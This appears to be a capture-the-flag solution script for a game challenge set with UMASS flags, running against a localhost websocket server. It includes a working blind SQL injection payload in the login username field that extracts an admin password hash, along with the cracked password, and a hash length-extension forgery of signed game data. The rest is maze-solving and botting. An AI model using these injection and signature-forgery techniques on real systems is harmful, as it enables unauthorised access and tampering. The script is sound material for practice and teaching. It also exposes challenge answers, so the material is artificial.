#!/usr/bin/env python

from util import *

from base64 import b64encode, b64decode
import asyncio
import json
import random
import re
import hashpumpy
import urllib
import uuid
import websockets
import zlib

async def try_char(websocket, i, guess):
    await websocket.send(serialize({
        "id": 1,
        "data": {
            "type": "login",
            "username": f"administrator\" AND SUBSTRING(HEX(password), {i}, 1) == '{guess}' --",
            "password": "test",
            "world": None
        }
    }))
    return deserialize(await websocket.recv()).get("data").get("error") != "user does not exist"


async def hello():
    async with websockets.connect("ws://localhost:8765") as websocket:
        # Challenge: chameleon
        #
        # Simple blind SQL injection.
        password = ""
        for i in range(32):
            for char in "0123456789ABCDEF":
                if await try_char(websocket, i + 1, char):
                    password += char
                    break
        assert(password == "F3DAF779D80C905D8CD46D9080C48199")
        # I'm not going to pull a password cracking tool into this solution
        # script, but you'd be able to get this fairly easily using the Rockyou
        # list. It's 'Lyndell08'.
        await websocket.send(serialize({
            "id": 1,
            "data": {
                "type": "login",
                "username": "administrator",
                "password": "Lyndell08",
                "world": None
            }
        }))
        flag = deserialize(await websocket.recv()).get("data").get("flag")
        print(f"chameleon: {flag}")

        character, world = await setup_session(websocket)

        # Challenge: easteregg
        #
        # This is a simple untrusted input vulnerability. Just pass an invalid
        # sign ID and you'll get the flag.
        await websocket.send(serialize({
            "id": 1,
            "data": {
                "type": "sign_text",
                "id": 7,
            }
        }))
        flag = re.findall(r"UMASS\{.*\}", deserialize(await websocket.recv()).get('data').get('text'))[0]
        print(f"easteregg: {flag}")

        # Challenge: easterisland
        #
        # Length extension attack. We want to overwrite the world so we can walk
        # over to the "island" area.
        world_data = parse_world(world)
        orig_data = urllib.parse.unquote_to_bytes(world["blob"])
        desired_data = b"," + encode_world(
            "grasslands",
            # Replace everything with a walkable surface.
            [[1 if y == 0 or y == 5 else y for y in row] for row in world_data.get("tilemaps").get("grasslands")],
            []
        )
        digest, data = hashpumpy.hashpump(world["signature"], orig_data, desired_data, len(b"kEYlEN97H_12_14"))
        new_world = { "signature": digest, "blob": urllib.parse.quote(data)}
        await websocket.send(serialize({
            "id": 1,
            "data": {
                "type": "login",
                "username": "Jakob",
                "password": "test",
                "world": json.dumps(new_world)
            }
        }))
        await websocket.recv()
        for _ in range(14):
            await websocket.send(serialize({
                "id": 1,
                "data": {
                    "type": "move_or_interact",
                    "direction": "south"
                }
            }))
            await websocket.recv()
        for _ in range(160):
            await websocket.send(serialize({
                "id": 1,
                "data": {
                    "type": "move_or_interact",
                    "direction": "east"
                }
            }))
            for event in deserialize(await websocket.recv()).get("data"):
                if event.get("type") == "message" and re.search(r"UMASS\{.*\}", event.get("text")):
                    flag = re.findall(r"UMASS\{.*\}", event.get('text'))[0]
                    print(f"easterisland: {flag}")

        # Challenge: scarymaze2
        #
        # Simple DFS/BFS of a graph.
        desired_data = b"," + encode_world(
            "grasslands",
            # Replace everything with a walkable surface.
            [[1 if y == 0 or y == 5 else y for y in row] for row in world_data.get("tilemaps").get("grasslands")],
            [{
                'id': '32f2a1e5-8b81-4284-a639-8f7cff0a6192',
                'position': {'x': 7, 'y': 7},
                'world_view': '🕳️',
                'type': 'portal',
                'minimum_level': 0,
                'target_world': 'maze1',
                'target_x': 3,
                'target_y': 3
            }]
        )
        digest, data = hashpumpy.hashpump(world["signature"], orig_data, desired_data, len(b"kEYlEN97H_12_14"))
        new_world = { "signature": digest, "blob": urllib.parse.quote(data)}
        await websocket.send(serialize({
            "id": 1,
            "data": {
                "type": "login",
                "username": "Jakob",
                "password": "test",
                "world": json.dumps(new_world)
            }
        }))
        await websocket.recv()
        await websocket.send(serialize({
            "id": 1,
            "data": {
                "type": "move_or_interact",
                "direction": "northwest"
            }
        }))
        # At this point we're in the first maze, so we'll do the following ad
        # infinitum:
        #
        # - Read out the maze from the `tilemaps` data.
        # - Perform BFS to find a path to the goal.
        # - Iterate through that path, sending a `move_or_interact` packet to
        #   move the character.
        # - Read out the new generated maze, if we haven't hit the goal yet.
        maze_n = 1
        while True:
            x, y = (3, 3)
            target_x, target_y = 0, 0
            maze = None
            events = deserialize(await websocket.recv()).get("data")
            flag_sentinel = False
            for event in events:
                if event.get("type") == "message":
                    if re.search(r"UMASS\{.*\}", event.get("text")):
                        flag = re.findall(r"UMASS\{.*\}", event.get('text'))[0]
                        print(f"scarymaze2: {flag}")
                        flag_sentinel = True
                elif event.get("type") == "update_world":
                    maze = parse_world(event.get("world")).get("tilemaps").get(f"maze{maze_n}")
                    for mob in parse_world(event.get("world")).get("mobs").get(f"maze{maze_n}"):
                        if mob.get("type") == "portal" and mob.get("target_world").startswith("maze"):
                            target_x = mob.get("position").get('x')
                            target_y = mob.get("position").get('y')
                        elif "award" in mob.get("type"):
                            target_x = mob.get("position").get('x')
                            target_y = mob.get("position").get('y')
                elif event.get("type") == "teleport_player":
                    x = event.get("target_x")
                    y = event.get("target_y")
            if flag_sentinel:
                break
            path = bfs(maze, (x, y), (target_x, target_y))
            if path is None:
                print("Detected no solution.")
                for row in maze:
                    for col in row:
                        if col == 5:
                            print("X", end="")
                        elif col == 6:
                            print(" ", end="")
                    print()
                exit(1)
            path.pop(0) # Ignore the starting position
            while len(path) != 0:
                next_x, next_y = path.pop(0)
                dx, dy = ((next_x - x), (next_y - y))
                x = next_x
                y = next_y
                direction = "north"
                if dx == 1 and dy == 1:
                    direction = "southeast"
                elif dx == 0 and dy == 1:
                    direction = "south"
                elif dx == -1 and dy == 1:
                    direction = "southwest"
                elif dx == 1 and dy == 0:
                    direction = "east"
                elif dx == -1 and dy == 0:
                    direction = "west"
                elif dx == 1 and dy == -1:
                    direction = "northeast"
                elif dx == 0 and dy == -1:
                    direction = "north"
                elif dx == -1 and dy == -1:
                    direction = "northwest"
                await websocket.send(serialize({
                    "id": 1,
                    "data": {
                        "type": "move_or_interact",
                        "direction": direction
                    }
                }))
                # Let the `recv` at the top of the loop get the packet if we've
                # hit the goal.
                if len(path) >= 1:
                    await websocket.recv()
            maze_n = (maze_n % 2 + 1)

        # Challenge: ascension
        #
        # The game's pretty easy, we just need to bot until we get a high enough
        # level to take on the final boss.
        character, world = await setup_session(websocket)
        world_data = parse_world(world)
        x, y = (0, 0)
        level = 0
        health = 3
        mobs = []
        while level < 100:
            orig_data = urllib.parse.unquote_to_bytes(world["blob"])
            # Fill the map with weaker enemies with a high experience yield.
            desired_data = b"," + encode_world(
                "grasslands",
                world_data.get("tilemaps").get("grasslands"),
                [{
                    "id": str(uuid.uuid4()),
                    "position": {
                        "x": 9,
                        "y": 8,
                    },
                    "type": "zombie",
                    "world_view": "x",
                    "health": 1,
                    "experience": 99999,
                    "strength": 0,
                    "agility": 0,
                    "accuracy": 0,
                    "drop": []
                }, {
                    "id": str(uuid.uuid4()),
                    "position": {
                        "x": 7,
                        "y": 8,
                    },
                    "type": "pickup",
                    "item": {
                        "id": str(uuid.uuid4()),
                        "type": "budlite",
                        "inventory_view": "X"
                    }
                }]
            )
            digest, data = hashpumpy.hashpump(world["signature"], orig_data, desired_data, len(b"kEYlEN97H_12_14"))
            new_world = { "signature": digest, "blob": urllib.parse.quote(data)}
            await websocket.send(serialize({
                "id": 1,
                "data": {
                    "type": "login",
                    "username": "Jakob",
                    "password": "test",
                    "world": json.dumps(new_world)
                }
            }))
            await websocket.recv()
            # Kill the weak enemy.
            events = []
            await websocket.send(serialize({
                "id": 1,
                "data": {
                    "type": "move_or_interact",
                    "direction": "west"
                }
            }))
            events += deserialize(await websocket.recv()).get("data")
            await websocket.send(serialize({
                "id": 1,
                "data": {
                    "type": "pickup_all"
                }
            }))
            events += deserialize(await websocket.recv()).get("data")
            target_x = 9
            target_y = 8
            sentinel = False
            while True:
                if health <= character["max_health"] - 2:
                    for item in character["inventory"]:
                        if item.get("type") == "budlite":
                            await websocket.send(serialize({
                                "id": 1,
                                "data": {
                                    "type": "consume_item",
                                    "id": item["id"]
                                }
                            }))
                            events += deserialize(await websocket.recv()).get("data")
                            break
                    else:
                        print("No beer! It's not a good day...")
                dx, dy = ((target_x - x), (target_y - y))
                dx = clamp(dx, -1, 1)
                dy = clamp(dy, -1, 1)
                direction = "north"
                if dx == 1 and dy == 1:
                    direction = "southeast"
                elif dx == 0 and dy == 1:
                    direction = "south"
                elif dx == -1 and dy == 1:
                    direction = "southwest"
                elif dx == 1 and dy == 0:
                    direction = "east"
                elif dx == -1 and dy == 0:
                    direction = "west"
                elif dx == 1 and dy == -1:
                    direction = "northeast"
                elif dx == 0 and dy == -1:
                    direction = "north"
                elif dx == -1 and dy == -1:
                    direction = "northwest"
                await websocket.send(serialize({
                    "id": 1,
                    "data": {
                        "type": "move_or_interact",
                        "direction": direction
                    }
                }))
                events += deserialize(await websocket.recv()).get("data")
                for event in events:
                    if event.get("type") == "update_position":
                        x = event.get("x")
                        y = event.get("y")
                    elif event.get("type") == "new_mob":
                        mobs.append(event.get("entity"))
                    elif event.get("type") == "move_mob":
                        for i, mob in enumerate(mobs):
                            if mob.get("id") == event.get("id"):
                                mobs[i]['position'] = event.get("new_position")
                    elif event.get("type") == "update_player":
                        character = event.get("entity")
                        if level < event.get("entity").get("level"):
                            sentinel = True
                        level = event.get("entity").get("level")
                        health = event.get("entity").get("health")
                for mob in mobs:
                    if mob.get("experience", 0) > 100:
                        target_x = mob.get("position").get("x")
                        target_y = mob.get("position").get("y")
                # print(f"Level: {level}")
                # print(f"Health: {health}")
                # print(f"Pos: {x}, {y}")
                # print()
                if sentinel:
                    break
            await websocket.send(serialize({
                "id": 1,
                "data": {
                    "type": "save_game"
                }
            }))
            await websocket.recv()
        # Now we're definitely strong enough to take on the final boss.
        orig_data = urllib.parse.unquote_to_bytes(world["blob"])
        # Fill the map with weaker enemies with a high experience yield.
        desired_data = b"," + encode_world(
            "grasslands",
            world_data.get("tilemaps").get("grasslands"),
            [{
                "id": str(uuid.uuid4()),
                "position": {
                    "x": 9,
                    "y": 8,
                },
                "type": "santaclaus",
                "world_view": "x",
                "health": 1,
                "experience": 99999,
                "strength": 0,
                "agility": 0,
                "accuracy": 0,
                "drop": []
            }]
        )
        digest, data = hashpumpy.hashpump(world["signature"], orig_data, desired_data, len(b"kEYlEN97H_12_14"))
        new_world = { "signature": digest, "blob": urllib.parse.quote(data)}
        await websocket.send(serialize({
            "id": 1,
            "data": {
                "type": "login",
                "username": "Jakob",
                "password": "test",
                "world": json.dumps(new_world)
            }
        }))
        await websocket.recv()
        target_x, target_y = 9, 8
        while True:
            events = []
            dx, dy = ((target_x - x), (target_y - y))
            dx = clamp(dx, -1, 1)
            dy = clamp(dy, -1, 1)
            direction = "north"
            if dx == 1 and dy == 1:
                direction = "southeast"
            elif dx == 0 and dy == 1:
                direction = "south"
            elif dx == -1 and dy == 1:
                direction = "southwest"
            elif dx == 1 and dy == 0:
                direction = "east"
            elif dx == -1 and dy == 0:
                direction = "west"
            elif dx == 1 and dy == -1:
                direction = "northeast"
            elif dx == 0 and dy == -1:
                direction = "north"
            elif dx == -1 and dy == -1:
                direction = "northwest"
            await websocket.send(serialize({
                "id": 1,
                "data": {
                    "type": "move_or_interact",
                    "direction": direction
                }
            }))
            events += deserialize(await websocket.recv()).get("data")
            for event in events:
                if event.get("type") == "message" and re.search(r"UMASS\{.*\}", event.get("text")):
                    flag = re.findall(r"UMASS\{.*\}", event.get('text'))[0]
                    print(f"ascension: {flag}")
        await websocket.close()


def clamp(x, a, b):
    if x < a:
        return a
    if x > b:
        return b
    return x


def training_dummy_array():
    ret = []
    for y in range(20):
        for x in range(20):
            ret.append({
                "id": str(uuid.uuid4()),
                "position": {
                    "x": 10 + x,
                    "y": 10 + y,
                },
                "type": "zombie",
                "world_view": "x",
                "health": 1,
                "experience": 99999,
                "strength": 0,
                "agility": 0,
                "accuracy": 0,
                "drop": [{
                    "id": str(uuid.uuid4()),
                    "type": "budlite",
                    "inventory_view": "b"
                } for _ in range(3)]
            })
    return ret


def neighbors(graph, node):
    ret = []
    x, y = node
    if y - 1 > 0   and x - 1 > 0   and graph[y - 1][x - 1] == 6:
        ret.append((x - 1, y - 1))
    if y - 1 > 0   and               graph[y - 1][x    ] == 6:
        ret.append((x    , y - 1))
    if y - 1 > 0   and x + 1 < 127 and graph[y - 1][x + 1] == 6:
        ret.append((x + 1, y - 1))
    if               x - 1 > 0   and graph[y    ][x - 1] == 6:
        ret.append((x - 1, y    ))
    if               x + 1 < 127 and graph[y    ][x + 1] == 6:
        ret.append((x + 1, y    ))
    if y + 1 < 127 and x - 1 > 0   and graph[y + 1][x - 1] == 6:
        ret.append((x - 1, y + 1))
    if y + 1 < 127 and               graph[y + 1][x    ] == 6:
        ret.append((x    , y + 1))
    if y + 1 < 127 and x + 1 < 127 and graph[y + 1][x + 1] == 6:
        ret.append((x + 1, y + 1))
    return ret


def bfs(graph, node, goal): #function for BFS
    visited = [] # List for visited nodes.
    queue = []   # Initialize a queue

    visited.append(node)
    queue.append([node])

    while queue:          # Creating loop to visit each node
        m = queue.pop(0)
        for neighbor in neighbors(graph, m[-1]):
            if neighbor == goal:
                m += [neighbor]
                return m
            elif neighbor not in visited:
                visited.append(neighbor)
                queue.append(m + [neighbor])


async def setup_session(websocket):
    """Register a user and generate a new world."""
    await websocket.send(serialize({
        "id": 1,
        "data": {
            "type": "register",
            "username": "Jakob",
            "password": "test"

        }
    }))
    await websocket.recv()
    await websocket.send(serialize({
        "id": 1,
        "data": {
            "type": "login",
            "username": "Jakob",
            "password": "test",
            "world": None

        }
    }))
    await websocket.recv()
    await websocket.send(serialize({
        "id": 1,
        "data": {
            "type": "create_character",
            "name": "Jakob",
            "age": 12,
            "class": "🤠",
            "order": "evil",
            "morality": "bad",
            "bonus": "💋 raygun (item; consumable)"

        }
    }))
    resp = deserialize(await websocket.recv())
    character = resp.get("data").get("character")
    world = resp.get("data").get("world")
    return character, world

asyncio.run(hello())
